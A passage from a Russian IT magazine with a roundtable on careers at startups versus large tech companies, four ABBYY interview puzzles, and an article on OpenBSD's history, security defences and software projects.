ствовал.


     Андрей Чупейкин,
     Яндекс

Кажется, что примерно одинаковую. В стартапе у тебя обычно больше техно-
логической свободы и можно набить себя опытом, а резюме buzzword’ами.
В большой компании ты можешь познать корпоративный мир и законы вы-
живания в нем, сложные процессы взаимодействия юнитов, служб, отделов
и прочее.
     Денис Аникин,
      Mail.Ru Group

Поработать в компании, где есть процессы, которые позволяют управлять
огромным организмом, — это само по себе опыт. В стартапе опыт другой. Это,
наоборот, опыт работы без процессов. Если у тебя слетел интернет на компью-
тере, ты идешь и чинишь его, разбираешься, почему не работает роутер. Если
упал сервер, ты идешь и поднимаешь его. То есть ты все делаешь сам. В боль-
шой компании есть разные департаменты, которые отвечают за разные куски.
Скажем, тебе нужно подписать договор с контрагентом. В стартапе ты сидишь
и вычитываешь его сам, потому что юристов у тебя нет. Очень много разнопла-
новых вещей ты делаешь сам. В большой компании ты просто сидишь, про-
граммируешь, а остальное делается за тебя.
   Зато после пяти-семи лет работы в Google, попав в другую компанию, люди
вообще не понимают, как жить. Потому что в Google, когда тебе нужна какая-то
статистика и аналитика, ты заходишь в их big data, вводишь запрос и он ищет
по всему Google и в момент тебе все выдает. В другой компании выясняется,
что нужно сначала поставить таск на админов, потом на аналитиков... А когда ты
приходишь в стартап, оказывается, что там нет вообще никого. Нужно написать
код, что-то поставить самому сбоку и так далее. То есть умение обеспечивать
какие-то свои базовые нужды теряется.


     Денис Бургачев,
     Яндекс

Плюс большой компании — стабильность и, как я уже говорил, более слож-
ные задачи. В большую компанию стоит идти человеку с хорошим начальным
уровнем и желанием учиться. Даже если не получится сделать суперкарьеру,
за первые два-три года будет значительный профессиональный рост.
   Маленькие компании — более индивидуальный подход, более разнообраз-
ные задачи (приходится быть на все руки мастером, как минимум в своей обла-
сти) и возможность вырасти вместе с продуктом и стать тимлидом.
      Антон Сачков,
     Яндекс

В начале карьеры есть потенциальные преимущества работы в стартапе: воз-
можность попробовать различные технологии и подходы к разработке, соста-
вить о них пусть и поверхностное, но мнение; есть возможность быстрого ка-
рьерного роста вместе с компанией, возможность получить опыт руководства
людьми, проведения собеседований; меньшая забюрократизированность
и потенциально меньшая стоимость ошибки позволяют молодому специалисту
экспериментировать, пробовать и ошибаться.
   Состоявшиеся специалисты тоже могут работать в маленьких компаниях или
стартапах, но при условии, что их не волнует «известность» и «престижность»
места работы и они готовы к рискам, которым мелкие компании более подвер-
жены (кризис, сокращение и прочее).
   Крупные же компании готовы им предоставить следующие преимущества:
большой «мозговой фонд» — всегда есть у кого поучиться; опыт масштаби-
рования процессов (на большие, разношерстные, распределенные команды);
крутая инфраструктура, которую к тому же поддерживают и развивают специ-
альные команды; возможность разрабатывать и развивать «общественно зна-
чимые» проекты; хорошая строчка в резюме; бОльшая стабильность.


     Александр Поляков,
     ЕRРSсаn

В случае большой компании ты получаешь хорошую рыночную зарплату и ста-
бильность. А в маленькой компании не говорят, что ты «работаешь». Ты прихо-
дишь в команду, занимаешься интересным делом, развиваешься. У тебя есть
отнюдь не малая возможность вырасти с компанией до IPO или как минимум
до продажи компании более крупному игроку. Некоторые из ранних сотрудни-
ков, остающихся до конца, получают прибыли, несравнимые с обычной ставкой
в корпорации. Это если говорить про профит. И еще одно. Конечно, в большой
компании есть много бонусов, связанных с доступностью обучения, получения
опыта участия в интересных проектах и подобным, но зачастую все плюсы ниве-
лируются отсутствием возможности все это применить. А иногда такие допвоз-
можности просто никому не нужны. В маленькой же компании в ответ на твой
запрос про оплату курсов на тебя посмотрят как на инопланетянина и скажут:
«Чувак, ты в каком веке? Тебе компьютер дан с доступом в интернет, что еще
нужно?» :) И это очень хорошо учит жизни и помогает с освоением практиче-
ского материала.
     Борис Рютин,
       Digital Security

В маленькой компании ты получаешь больше ответственности, потому что ты
видишь небольшую команду, где все друг друга знают, она более сплоченная.
Да, ты работаешь больше, чем в крупной компании, но и результаты, наверное,
будут поинтереснее.

ЕСТЬ ЛИ РАЗНИЦА В ТОМ, ЧЕГО ЖДУТ ОТ СОИСКАТЕЛЕЙ РА-
БОТОДАТЕЛИ КРУПНЫХ И НЕБОЛЬШИХ КОМПАНИЙ, НА ВАШ
ВЗГЛЯД? СКАЖЕМ, ОДНИМ НУЖНА ИСПОЛНИТЕЛЬНОСТЬ,
ДРУГИМ — УВЛЕЧЕННОСТЬ.

      Станислав Протасов,
      Acronis

Индустрия у нас маленькая, крупных компаний тоже мало, и это приводит
к тому, что нанять программистов с хорошим опытом, знающих двухсвязные
списки и что-то еще, тяжелее, чем где-нибудь в Кремниевой долине.


     Андрей Чупейкин,
     Яндекс

Все зависит от потребностей и задач. И туда и туда нанимают как стажеров, так
и звезд.


     Денис Аникин,
      Mail.Ru Group

В стартапе, скорее, важно не то, что ты знаешь стек. Скажем, у них PHP, Apache,
MySQL, а ты программируешь на Python, PostgreSQL, Django. То есть ты мо-
жешь прийти куда угодно: в стартап или в Mail.Ru, и их стек может быть совсем
не таким, как твой. Но это неважно. Важно то, что у тебя есть базовые знания
о том, как все работает.
     Денис Бургачев,
     Яндекс

Кажется, что разницы никакой, все зависит от предъявляемых требований —
они бывают как высокими, так и самыми базовыми и в крупных, и в небольших
компаниях. Единственное, что в небольшую компанию могут более придирчиво
отбирать по личным качествам, по тому, нравится человек или нет.


      Антон Сачков,
     Яндекс

Стартапы и небольшие компании отдают преимущество следующим типам кан-
дидатов: приведенным по знакомству (доверенный круг), эмоционально вовле-
ченным (готовым работать двадцать часов в сутки, поднимать сервис по но-
чам), самостоятельным и многопрофильным (написать код, настроить сервер,
мониторинги, деплой). В крупных компаниях при найме учитывают больше экс-
пертные знания в конкретной области (помимо общей технической грамотно-
сти), организованность и коммуникабельность.


     Александр Поляков,
     ЕRРSсаn

Набирая персонал в маленькую компанию, смотрят на то, разделяешь ли ты ви-
дение руководства и есть ли у тебя зачатки способностей для того, чтобы выра-
сти из стажера в руководителя отдела, например, за полгода. Но, естественно,
помимо маленьких и больших компаний есть и средние, небольшие и совсем
маленькие. Это как между черным и белым есть целая гамма разных оттенков
серого. Поэтому однозначно судить сложно.


     Борис Рютин,
       Digital Security

Исполнительность нужна везде. И там, и там от тебя ждут результата. Просто
в больших компаниях больше шансов оставаться незамеченным. Хотя тут тоже
зависит и от компании и, конечно, от самого человека.
НАСКОЛЬКО ЗНАЧИМО ПРОФИЛЬНОЕ ОБРАЗОВАНИЕ
ПРИ РАССМОТРЕНИИ КАНДИДАТА?

      Станислав Протасов,
      Acronis

Я считаю, знания вообще лишними не бывают. Когда ты работаешь в ка-
кой-то области и хочешь развиваться профессионально, очень полезно
знать основы. Это все равно что... если я хочу быть профессиональным во-
дителем или гонщиком, мне совершенно не помешает разбираться в том,
как устроен двигатель машины или подвеска. Если же я просто водитель-не-
профессионал — сел в машину и поехал домой, — это лишнее знание. Оно
забьет мою голову, но пользы мне не принесет. Даже если я воображаю
себя гонщиком и постоянно соревнуюсь с кем-то на светофорах, мне ниче-
го не даст знание о том, как устроен двигатель. А гонщику — даст.


     Андрей Чупейкин,
     Яндекс

Когда просматриваешь резюме, обращаешь на это внимание, но это не главное.
Тут скорее важно любить свою профессию. Есть много толковых ребят без выс-
шего образования или с неоконченным высшим, которые фанатичны в своем
деле и могут собрать сервис с нуля, начиная от поднятия физических серверов
и заканчивая написанием мониторингов на время отрисовки страницы.


     Денис Бургачев,
     Яндекс

Ноп. Нет. Нихт. Найн.


      Антон Сачков,
     Яндекс

Профильное образование является небольшим плюсом в общей картине,
так как повышает вероятность того, что кандидат обладает хорошей теоре-
тической базой и знает основы информационных технологий.
     Александр Поляков,
     ЕRРSсаn

Мы довольно активно набираем профессионалов. Не просто с профиль-
ным образованием, но и с опытом работы в определенных областях. Главное
при этом — чтобы наши взгляды в самом важном совпадали.
   Что касается наличия профильного образования как критерия при найме,
мне встречалось крайне мало технарей, которых можно было бы назвать пол-
ностью самоучками. Однако может быть такое, что у человека отсутствует про-
фильное образование или вообще нет высшего образования, но он ответит
на три моих вопроса. И тогда я его возьму :).


     Борис Рютин,
       Digital Security

Если ты не засветился где-то, к примеру выступал на конференциях или твое
имя на слуху (ты взломал GitHub, допустим, как с некоторыми было), то HR бу-
дет смотреть на тебя по стандартным показателям. В первую очередь — есть
ли высшее образование.

МОГУТ ЛИ КАК-ТО ЛИЧНЫЕ УВЛЕЧЕНИЯ ЧЕЛОВЕКА ПОВЛИЯТЬ
НА ЕГО ШАНСЫ ПОЛУЧИТЬ МЕСТО РАЗРАБОТЧИКА?

      Станислав Протасов,
      Acronis

Для большинства людей работа — это всего лишь работа. Средство обе-
спечения жизнедеятельности. Очень часто — даже не основной интерес
в жизни. Я считаю, что так быть не должно. Но для большинства людей
это не так, нужно это понимать. У них есть другие интересы. Сегодня он
веб-программирует, потому что это дает ему доход, с помощью которого он
решает вопросы жизнеобеспечения. При этом у него могут быть другие ин-
тересы, любые — рыбалка, семья или просто попкорн и телевизор.
  Но я думаю, что нам сейчас по-прежнему нужны люди, которые горят, которые
видят себя в работе и хотят стать лучшими в мире специалистами. Хотят профес-
сионально расти. У нас в Acronis сейчас порядка трехсот разработчиков. Если мы
вырастем до 30 тысяч, как Microsoft, то мы начнем брать таких людей, для которых
программирование — просто способ получения зарплаты. Но нужно выстроить
до этого момента систему, чтобы работа человека в конечном результате была
в плюс, а не в минус. Такого рода люди нужны. Без них тоже нельзя.
     Андрей Чупейкин,
     Яндекс

Когда узнаю, что разработчик не пьет, — расстраиваюсь. Один из моих кол-
лег предлагал ввести пятый этап собеседования в баре, чтобы раскрыть все
стороны человека и избавить его от волнения :).
   Если серьезно, то стремление к развитию дает дополнительные очки.
   Ну и кандидат не должен состоять в ИГИЛ (организация запрещена на тер-
ритории РФ).


     Денис Аникин,
      Mail.Ru Group

Личные качества, которые я проверяю, очень просты. Я проверяю ownership. То,
что по-русски называется ответственность. Второе — это фокусировка на ре-
зультате. Ты можешь относиться к продукту по-хозяйски, но фокусироваться
не на результате. Ты думаешь о красоте кода, о чем-то еще, но не о результа-
те. Это важно. Нам нужен результат. Третье — это команда. Ты должен уметь
работать в команде. Если твой товарищ облажался, ты должен уметь сделать
так, чтобы все было хорошо. Несмотря на то, что «это он облажался!». Ну и что?
Это чем-то похоже на футбол или другой командный вид спорта. Кто играл, тот
знает, что в футболе проигрывает и выигрывает вся команда.


     Денис Бургачев,
     Яндекс

Для технической стороны интервью никакие личные увлечения значения не име-
ют. На личное восприятие человека они, конечно же, влияют, и, как следствие,
шансы могут поменяться.


      Антон Сачков,
     Яндекс

Связанные с разработкой — безусловно, да (участие в хакатонах, конфе-
ренциях, написание профильных статей).
     Александр Поляков,
     ЕRРSсаn

Возможно, это прозвучит непрофессионально или вообще незаконно, но ДА.
Потому что все, чем человек увлекается, формирует его личность. И здесь очень
сложно говорить однозначно, ведь правильно сопоставить увлечения и прове-
сти корреляцию непросто. Но внимание на собеседованиях этому вопросу мы
уделяем.


     Борис Рютин,
       Digital Security

Скорее да. Ведь встречают по одежке. Да и намного комфортнее работать с
человеком, если его увлечения схожи с твоими. И поскольку необычные реше-
ния и интересные идеи им приходят не во время основного рабочего процес-
са, а во время отдыха, появляется возможность их сразу же и обсудить.

У КОГО БОЛЬШЕ ШАНСОВ ПОЛУЧИТЬ РАБОТУ — У УЗКОНА-
ПРАВЛЕННОГО СПЕЦИАЛИСТА, ДОСКОНАЛЬНО ЗНАЮЩЕГО
СВОЮ ОБЛАСТЬ, ИЛИ У ЧЕЛОВЕКА НЕ ТАКОГО КЛАССИФИ-
ЦИРОВАННОГО, НО ИМЕЮЩЕГО ПРЕДСТАВЛЕНИЕ О ТОМ,
КАК РАБОТАЕТ ВСЯ СИСТЕМА?

      Станислав Протасов,
      Acronis

С моей точки зрения, люди работают наиболее эффективно, наиболее про-
изводительны и делают удивительные вещи именно тогда, когда думают
об общей картине. Человек должен четко понимать, какие другие компо-
ненты используются, как выглядит продукт в целом. Однако я полагаю, что
в программировании глубокое понимание в какой-то сфере тоже дает лег-
кий вход в новые области. Да, там может быть другой язык и другие модели
программирования, но все это относительно легко понять, если ты в чем-то
глубоко разбираешься.


     Андрей Чупейкин,
     Яндекс

Все зависит от потребностей и задач. И такие, и такие люди нужны.
     Денис Аникин,
      Mail.Ru Group

Когда мы собеседуем программистов, нас интересует несколько вещей: их
умение решать алгоритмические задачи, общее понимание алгоритмики, их
знание Linux, еще что-то — знание нетворкинга, к примеру. Все остальное...
знаешь ты SQL, не знаешь, умеешь ли работать с конкретными фреймворка-
ми, не интересует ни Mail.Ru, ни нас. Если ты умеешь программировать на ка-
ком-то языке, решать алгоритмические задачи и понимаешь, как работает ком-
пьютер... Это важно, отсюда и Linux всплывает. Потому что ты можешь уметь
программировать в стиле Дональда Кнута, но не понимать, что есть память, она
выделяется и освобождается ОС и так далее. Если же ты понимаешь и то и дру-
гое, ты очень крут, мы тебя берем, и неважно, что ты не знаешь каких-то кон-
кретных продуктов. По крайней мере, у меня всегда так. Для меня нет разницы.


     Денис Бургачев,
     Яндекс

Полезны оба типа людей, редко бывает, что им не найдется своего применения
(это я как представитель относительно крупной компании говорю). В неболь-
шую фирму на все руки мастер, конечно, предпочтительнее.


      Антон Сачков,
     Яндекс

Зависит от роли, на которую ищем человека. Если требуется эксперт в оптими-
зации производительности клиентской части, то лучше нанять узкопрофильно-
го эксперта, чем того, кто отовсюду знает понемногу.


     Александр Поляков,
     ЕRРSсаn

Я бы скорее принял человека, наиболее подходящего для решения тех задач,
которые от него требуются и в решении которых он хочет быть полезен.
     Борис Рютин,
       Digital Security

Сложный вопрос. Я бы основывался на сроках выполнения проекта, оценил бы
перспективы. Если время терпит, то второй вариант предпочтительнее.


ОСТАЕТСЯ ЛИ У СОТРУДНИКОВ ВРЕМЯ И ЖЕЛАНИЕ ЗАНИ-
МАТЬСЯ СВОИМИ ПРОЕКТАМИ ИЛИ КАКИМ-ТО СВЯЗАННЫМ
С ТЕХНОЛОГИЯМИ ХОББИ?

      Станислав Протасов,
      Acronis

У всех людей свои интересы, ничего страшного в этом нет, это не повод
отказать. У нас нет цели, чтобы человек сюда зашел, мы пристегнули его
наручниками к батарее и дальше он или программирует, или нет. Какое-то
хобби — это хорошо. К сожалению, работа головой изматывающая, а хобби
позволяет человеку быстрее восстановиться. Но если человек, например,
деньги ворует... даже если он хороший специалист, мы будем вынуждены
его уволить. По многим причинам. Во-первых, это противозаконная деятель-
ность, и, конечно же, полиция придет. Во-вторых, это просто неприемлемо
с точки зрения морали. В-третьих... сразу встает вопрос, не будет ли чело-
век совершать похожие действия против тебя.


     Андрей Чупейкин,
     Яндекс

Желание есть всегда и у большинства. И это хорошо. Технические проекты мож-
но пилить, но если есть желание делать это в рабочее время, то необходимо,
чтобы они пересекались с интересами компании и были запланированными,
как другие проекты.
   Например, ребята не так давно сделали Telegram-бот для Маркета, а кто-то
поехал на хакатон «ВКонтакте» и занял первое место вместе с призом зритель-
ских симпатий.


     Денис Бургачев,
     Яндекс

Если да, то он плохо работает (демонический хохот).
      Антон Сачков,
     Яндекс

Желание — да. Время — зависит от способности конкретных людей себе это
время организовывать (планировать).


     Александр Поляков,
     ЕRРSсаn

Все зависит только от человека. Как и вообще в жизни. Все зависит ТОЛЬ-
КО от тебя, никто не будет решать что-то за тебя — ни твой босс, ни родители,
ни государство, ни рынок. Когда примешь эту мысль, будет проще :).


     Борис Рютин,
       Digital Security

И у хорошего разработчика, и у исследователя желание не просто остается, а
обязано быть. А вот количество часов, которые можно выделить на свои инте-
ресы, скорее, зависит от самого человека. Хорошее правило есть в компании
Google, которое гласит, что 20 процентов времени нужно уделать сторонним
проектам (сейчас вроде бы его немного изменили, и нужно выбирать проекты
только внутри самой компании. Но, учитывая их количество...).


ИТОГИ
Плюсы стартапа
•  Легче устроиться без профильного образования
•  Более тесные и дружеские отношения
• Можно выбирать и использовать новейшие технологии, а потом написать
   в резюме модные слова
•  Часто можно заниматься чем-то по-настоящему прорывным, революцион-
   ным, а не пилить условный «CSS-файл для формы логина»
•  Больше личной свободы: работа из дома, отсутствие фиксированных часов,
   необязательность больничных
•  Несложные процессы взаимодействия в команде — никакой бюрократии,
   метрик, оценок продуктивности
•  Есть шанс получить опцион и в случае успеха заработать больше, чем в круп-
   ной компании
•  Более быстрый карьерный рост
Достоинства большой компании
•  Стабильность и комфорт
•  Налаженные процессы внутри компании
•  Не надо заниматься тем, в чем ты не специалист
• Можно учиться у гуру
•  Доступ к большим ресурсам и развитой инфраструктуре
•  Более сложные и интересные проекты
•  Возможность посмотреть, как все устроено в корпорациях
•  Не придется работать больше, чем прописано в договоре
•  Известное название хорошо смотрится в резюме
КОДИНГ





                                       Александр Лозовский
 ЗАДАЧИlozovsky@glc.ru
  НА СОБЕСЕДОВАНИЯХ

Компанию ABBYY ты помнишь еще с тех времен, когда она
показала тебе, что для написания рефератов в школе или ин-
ституте больше не надо перепечатывать кучу бредятины из
бумажной литературы: достаточно сунуть ее втвой любимый
LPT-сканер и распознать то, что получится.
  Немало воды утекло со времен лихих девяностых, и теперь
ABBYY разрабатывает решения в области интеллектуальной
обработки информации и лингвистики, известные во всем
мире. А мы не только знаем, что ABBYY читается как «Аби», но
и котируем эту компанию как достойного работодателя.
ЗАДАЧА 1
Дан массив из целых чисел. Найти такие m <= k, чтобы сумма a[m] + a[m+1] + ...+
a[k] была максимальна. Время работы должно быть порядка длины массива.

ЗАДАЧА 2
Дан текст, состоящий из N слов, длина которых не превосходит некоторой
небольшой константы. Предложите хотя бы два способа вывести частоты вхож-
дения слов в текст за субквадратичное время, объясните их преимущества
и недостатки.

ЗАДАЧА 3
Даны числительные языка хауса:
   đaribakwai da hamsin da shidda 756
    sittada đaribakwai da biyar 6705
    saba’ada đaribiyar da sittin 7560
1. Переведите с хауса: saba’in da biyar, đarishidda da sittin da shidda
2. Запишите на хауса: 67 и 5605

ЗАДАЧА 4
Есть генератор случайных чисел, который с равной вероятностью генерирует
дискретные значения 1, 2, 3, 4 и 5. Как, имея этот генератор, получить генера-
тор, который бы равновероятно выдавал дискретные значения 1, 2, 3, 4, 5, 6 и 7?

IT-КОМПАНИИ, ШЛИТЕ НАМ СВОИ ЗАДАЧКИ!
Миссия этой мини-рубрики — образовательная, поэтому мы бесплатно публи-
куем качественные задачки, которые различные компании предлагают соиска-
телям. Вы шлете задачки на lozovsky@glc.ru — мы их публикуем. Никаких актов,
договоров, экспертиз и отчетностей. Читателям — задачки, решателям — по-
дарки, вам — респект от нашей многосоттысячной аудитории, пиарщикам —
строчки отчетности по публикациям в топовом компьютерном журнале.

ЧИТАТЕЛИ, ШЛИТЕ ВАШИ ОТВЕТЫ!
Правильные ответы принимает Татьяна Поташева: Tatiana_P@abbyy.com.

МОЩНЫЙ ПРИЗ РЕШАТЕЛЮ!
Первый читатель, верно решивший все задачи, получает ABBYY FineReader 12
Professional.
UNIXOID
ТУР ПО BSD                           OPENBSD,
                         OPENSSH
                        И ТЕО
                          ДЕ РААДТ





                                                                                   Евгений Зобнин
                                                                                                                  androidstreet.net
«Всего две удаленные уязвимости за черт знает
сколько лет!» — слоган OpenBSD, самой безопасной
UNIX-подобной операционной системы. Долгое вре-
мя OpenBSD получала финансирование от DARPA,
созданный ее разработчиками сервер OpenSSH
знаком любому IT-шнику, а разные компоненты этой
ОС используются в твоем компе, смартфоне и роуте-
ре. OpenBSD — поистине бриллиант семейства BSD,
и сегодня мы вглядимся в его грани.

ИСТОРИЯ ВОПРОСА
История OpenBSD, ее философия, идеи и вообще причина существования
тесно связаны с Тео де Раадтом, эксцентричным, высокомерным, невыноси-
мым в общении, но невероятно талантливым программистом и руководите-
лем. Тео стоял у истоков NetBSD, и придумал ей имя тоже он, однако много-
численные конфликты с другими участниками команды и просто неуважение
к оппонентам в споре привели к тому, что в декабре 1994 года его с шумом вы-
ставили из команды разработчиков.
   Долгое время, пытаясь наладить контакт или, скорее сказать, выпросить до-
ступ к репозиторию кода, Тео продолжал программировать, допиливать порт
NetBSD на SPARC, но в конце концов сдался и просто пропал. Однако вместо
того, чтобы затеряться среди программистов в какой-нибудь крупной IT-ком-
пании, он форкнул NetBSD и на свой страх и риск начал разработку совершен-
но новой ОС, решив развивать ее по своим собственным законам и правилам.
  Одна из его ключевых идей состояла в том, что операционка должна раз-
виваться абсолютно открыто, а свежайший код всегда должен быть доступен
для изучения всем желающим. Так появился первый публичный анонимный
CVS-репозиторий кода, идея абсолютно обыденная сегодня, но в те времена
кардинально новая. Это принесло плоды, и вскоре независимые разработчики
начали присылать свои патчи, а к команде присоединились другие люди. Уже
в июле 1996 года, через полгода после основания проекта, состоялся релиз
OpenBSD 1.2, а в октябре за ним последовал релиз 2.0, после чего выпуск ре-
лизов начал происходить каждые полгода, невзирая на погоду, болезни, ката-
строфы или любые другие помехи.
   Последний на момент написания статьи релиз OpenBSD — 5.8, и на сегод-
ня это самая популярная BSD-система после FreeBSD. На OpenBSD работает
огромное количество устройств, большинство из них сетевые фильтры. А о том,
где используются ее компоненты, так и вообще не приходится говорить: iOS,
Android, Windows, OS X; так или иначе части OpenBSD можно найти практически
везде, и это еще не считая OpenSSH, созданного ее разработчиками.
   Если говорить о рядовых пользователях, то это достаточно большой костяк,
а самое главное, что почти каждый из них не просто «перешел на OpenBSD»,
а стал ярым фанатом системы и того пути, по которому идет ее развитие. Опе-
рационка действительно очень сильно к себе располагает, и причина тому —
идеология.


                                                                   Тео де
                                                                    Раадт





                                                            INFO

                                                                             Для каждого
                                                                                    нового релиза
                                                                        OpenBSD
                                                                                        готовится своя
                                                                                    собственная
                                                                                   композиция.


ТРИ СТОЛПА OPENBSD
OpenBSD держится на трех столпах, причем не просто держится, а вцепилась
в них мертвой хваткой:
•  приверженность идеям СПО;
•  качество кода;
•  безопасность.

Идеи СПО
Разработчики OpenBSD очень трепетно относятся к тому, каким образом ли-
цензируется код для включения в систему. Исходный код самой системы рас-
пространяется под лицензией ISC, которая является упрощенным вариантом
лицензии BSD и сводится к одному простому предложению: «Делайте с кодом
все, что хотите, но не говорите, что он написан вами».
   Однако в отношении стороннего софта, включенного в поставку OpenBSD,
действуют жесткие правила. По сути, есть только две приемлемые для разра-
ботчиков сторонние лицензии: BSD и MIT, остальные считаются «нежелатель-
ными». По этой причине разработчики регулярно предпринимают попытки пе-
реписать известный GNU-софт, распространяемый по лицензии GPL, или найти
ему замену. В свое время были переписаны многие утилиты, включая diff и grep,
а знаменитый OpenBSD-шный брандмауэр PF появился как ответ на измене-
ние политики лицензирования IPFilter. Регулярно поднимается вопрос о соз-
дании собственного C-компилятора для замены GCC, однако возможностей
для этого пока нет.
   Тео де Раадт никоим образом не приемлет включение бинарных блобов
в ядро. По его словам, бинарный код, аудит которого нельзя провести, не вы-
зывает доверия и может работать абсолютно непредсказуемо или содержать
закладки. Поэтому нередко разработчики OpenBSD вынуждены заниматься
реверс-инжинирингом проприетарных драйверов, и именно благодаря этим
ребятам мы имеем открытые драйверы для многих устройств.


                                                                       Загрузка
                                                            OpenBSD





Качество кода и безопасность
OpenBSD по праву считается «системой для параноиков». Такого количества
включенных по умолчанию средств защиты нет больше ни в одной другой про-
дакшен ОС. Более того, многие из средств защиты, используемых сегодня по-
всеместно (privilege separation, например), были либо придуманы, либо впервые
внедрены разработчиками OpenBSD. Эти механизмы совершенствуются с каж-
дым новым релизом ОС, регулярно появляются и обкатываются новые идеи.
  Одна из ключевых идей OpenBSD — тотальная рандомизация всего, что толь-
ко можно. Процессы всегда создаются с рандомными идентификаторами (PID),
номера inode при создании файлов назначаются случайным образом, системный
вызов bind() использует случайные порты для привязки сокетов, начальные но-
мера последовательности в TCP-соединении всегда случайны, timestamp’ы слу-
чайны. Все это сделано для того, чтобы максимально усложнить жизнь взломщику.
   Вторая идея — всесторонняя борьба с атаками, направленными на срыв
стека. Первая линия обороны здесь — это уже ставший стандартом принцип
privilege separation, когда приложение получает необходимые ему повышен-
ные полномочия (права root) только на короткие промежутки времени, так что
взломщик приложения не сможет раздобыть права root в большинстве случаев.
Лучший пример здесь — это OpenSSH, который работает попеременно на трех
«уровнях доступа»: monitor, в котором ему доступны права root, slave — когда
код работает с правами специального юзера sshd, и второй вариант slave, ког-
да OpenSSH обслуживает пользовательскую сессию и работает с его правами.


                                                                  Разделение
                                                                  привилегий
                                                                    в OpenSSH





Вторая линия обороны — безопасные версии функций Libc и -fstack-
protector. Когда-то, чтобы решить проблему переполнения буфера при ис-
пользовании функций strcpy() и strcat(), в библиотеку Libc были введены
функции strncpy() и strncat(), позволяющие ограничить размер копируе-
мых данных и не допустить переполнения. Однако сами эти функции также ока-
зались уязвимыми и в случае неправильного использования тоже приводили
к выходу за границы буфера. По этой причине разработчики OpenBSD реали-
зовали собственные «правильные» версии функций под названием strlcpy()
и strlcat() и перевели на их использование все компоненты ОС.
  OpenBSD также была одной из первых систем с принудительной сборкой
всех приложений компилятором GCC с включенной опцией ProPolice (аргумент
командной строки -fstack-protector). Данный механизм слегка модифици-
рует код приложения перед окончательной сборкой, а именно заставляет его
размещать в стеке случайный набор данных (canary) перед вызовом небезо-
пасных функций и проверять его наличие после совершения вызова. В случае
срыва стека canary будет затерт, приложение это заметит и просто завершится.
  Данный метод защиты сегодня используется практически во всех ОС, вклю-
чая все BSD и ведущие дистрибутивы Linux. Но разработчики OpenBSD пошли
еще дальше: в дополнение к -fstack-protector они реализовали в ядре ме-
ханизм, внедряющий небольшой «разрыв» случайного размера в начале стека,
так что, если атакующий использует классический прием срыва стека, застав-
ляя приложение исполнять шелл-код, находящийся в самом стеке, он потерпит
неудачу, поскольку не будет знать, по какому адресу находится этот код.
   Третья линия — ASLR, randomized malloc() и W^X. OpenBSD стала первой
ОС с включенным по умолчанию механизмом ASLR. Последний позволяет ран-
домизировать адреса регионов памяти процесса (таких как стек, куча, область
данных), кода и библиотечных функций. В результате выполнить некоторые типы
атак, например ret2libc, стало практически невозможно. Кроме того, в OpenBSD
имеется уникальный механизм рандомизации кучи путем выделения случайных
регионов памяти при вызове malloc() (вместо ее простого расширения).


                                                                                 malloc()
                                                                          с рандоми-
                                                                  зацией





Еще одна уникальная для OpenBSD функция — это W^X (write or execute). Она
гарантирует, что страница памяти процесса одновременно может быть либо за-
писываемой, либо исполняемой, но не оба варианта сразу. Это обеспечивает,
например, что внедренный в стек шелл-код не будет выполнен (так как стек —
записываемая область памяти). На современных платформах W^X использует
специальный NX-бит (No eXecute), появившийся в 64-разрядных процессорах
Intel и AMD, и в этом нет ничего уникального (Linux делает то же самое), однако
в OpenBSD такая защита работает даже на 32-битных процессорах i386.
  В целом уровень защитных механизмов OpenBSD довольно параноидален.
Дело доходит даже до того, что по умолчанию шифруется раздел подкачки,
причем вовсе не для галочки. Swap-раздел разбивается на небольшие участки,
каждый из которых шифруется собственным случайным ключом. Освобожде-
ние и «очистка» занятых участков происходит с помощью отзыва ключа.
  Но и это еще не все. В последних релизах разработчики пошли дальше и на-
чали выпиливать из ядра вполне полезный, но несущий проблемы с безопас-
ностью код. Так, из версии 5.7 были убраны поддержка модулей ядра (чтобы
никто не загрузил ядерный бэкдор) и виртуальная ФС /proc (чтобы никто не по-
дсматривал за чужими процессами), а в текущем коде уже исчезла поддержка
эмуляции Linux. Справедливости ради стоит отметить, что в OpenBSD данные
механизмы никогда не были особо нужны и рядовой пользователь даже не за-
метит их отсутствия.

СОФТ
В рамках проекта OpenBSD развивается не только ОС, но и внушительное ко-
личество субпроектов. Один из таких проектов — это, конечно же, OpenSSH,
но на нем мы останавливаться не будем. Также у проекта есть свой собственный
SMTP-сервер (OpenSMTPD), веб-сервер (httpd), спам-фильтр (spamd) и даже
менеджер окон (cwm). В OpenBSD интегрирован PF — один из самых продви-
нутых брандмауэров, который был портирован во все остальные BSD-системы,
OS X, iOS и QNX.

Софт, развиваемый в рамках проекта OpenBSD

OpenSSH — самая известная и популярная реализация протокола SSH.
•  LibreSSL — форк OpenSSL, очищенный от устаревших алгоритмов, поддерж-
   ки устаревших ОС и мертвого кода.
• OpenSMTPD — SMTP-сервер с поддержкой PAM, Maildir и виртуальных до-
   менов.
•  OpenNTPD — простой NTP-сервер (Network Time Protocol).
•  httpd — легкий HTTP-сервер с поддержкой CGI и HTTPS.
•  relayd — балансировщик нагрузки и прокси.
•  dhclient — реализация DHCP-клиента.
• OpenBGPD — реализация протокола BGP-4 (Border Gateway Protocol).
• OpenOSPFD — реализация протокола маршрутизации OSPF (Open Shortest
   Path First).
•  OpenIKED — реализация протокола IKEv2 (Internet Key Exchange).
• CARP — Common Address Redundancy Protocol, свободная реализация сте-
   ка протоколов HSRP/VRRP Cisco.
•  PF — брандмауэр с поддержкой NAT, PAT, QoS и нормализации трафика.
•  pfsync — протокол синхронизации состояний брандмауэров.
•  spamd — спам-фильтр с поддержкой серых списков и интеграцией с PF.
•  sndio — звуковой сервер, аналог PulseAudio.
•  duas — легковесная альтернатива утилите sudo.
•  tmux — менеджер терминалов, аналог GNU Screen.
• cwm — легковесный менеджер окон для X Window system.



ВЫВОДЫ
Разработчики OpenBSD очень продуктивны во всем, что касается генера-
ции идей и написания сложного кода. Именно они впервые обкатали все те
идеи, что сегодня стандартны в других операционных системах, они же созда-
ли OpenSSH, без которого жизнь современного админа просто немыслима.
Однако не стоит думать, будто это все, что можно было получить от системы.
OpenBSD очень красива и действительно удобна для применения в продакше-
не. Здесь все на своих местах и абсолютно логично, утилиты имеют единый ин-
терфейс, встроенные сервисы — единый простой и понятный формат конфи-
гурации, а настраивать даже сложные конфигурации брандмауэра — приятное
времяпрепровождение. Достаточно просто поставить систему и попробовать
поднять на ее базе какой-то сервис, чтобы ощутить, настолько современный
Linux далек от понятия простоты и удобства.
UNIXOID
ПРИРУЧАЕМ
СФИНКСА





    Артём Зорин
temazorin@hotmail.com

ПРИКРУЧИ-
ВАЕМ
CMU SPHINX
